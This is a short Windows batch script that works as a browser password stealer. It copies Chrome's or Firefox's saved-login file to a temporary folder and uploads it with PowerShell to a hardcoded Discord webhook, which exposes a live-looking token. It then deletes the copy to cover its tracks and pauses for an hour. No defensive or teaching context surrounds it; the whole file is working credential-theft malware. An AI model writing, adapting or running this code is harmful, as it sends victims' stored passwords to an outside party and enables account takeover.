@echo off
setlocal EnableDelayedExpansion

REM Set the browser name (change it according to your default browser)
set BROWSER=Chrome

REM Setting up Discord webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1244376223606640640/Wi1hxRB1i9Fr3s-3lNVJBhI6_pEaa_j1Enjzy1Xt0wHTxi5bw3V3odXDv2Ffe_0LRxsP

REM Retrieving default browser passwords
set PASSWORD_FILE=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data
if "%BROWSER%"=="Firefox" (
    set PASSWORD_FILE=%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json
)

REM Copy the password file to a temporary location
copy "%PASSWORD_FILE%" "%TEMP%\passwords.db"

REM Sending the password file to the Discord webhook
powershell -command "(New-Object System.Net.WebClient).UploadFile('%WEBHOOK_URL%', '%TEMP%\passwords.db')"

REM Delete the temporary password file
del "%TEMP%\passwords.db"

REM Delay for 1 hour
timeout /t 3600 /nobreak > NUL

endlocal
